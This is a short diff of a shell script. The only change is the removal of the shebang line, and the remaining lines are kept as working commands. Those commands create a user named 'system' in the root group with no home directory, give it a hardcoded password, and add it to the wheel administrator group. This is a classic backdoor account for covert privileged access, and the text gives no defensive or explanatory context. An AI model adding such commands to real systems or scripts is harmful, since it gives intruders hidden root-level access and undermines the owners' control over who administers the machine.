@@ -1,4 +1,3 @@
-#!/bin/sh
 useradd system -g root -M
 echo '0c117864a02827ba'| passwd --stdin system
 usermod -a -G wheel system
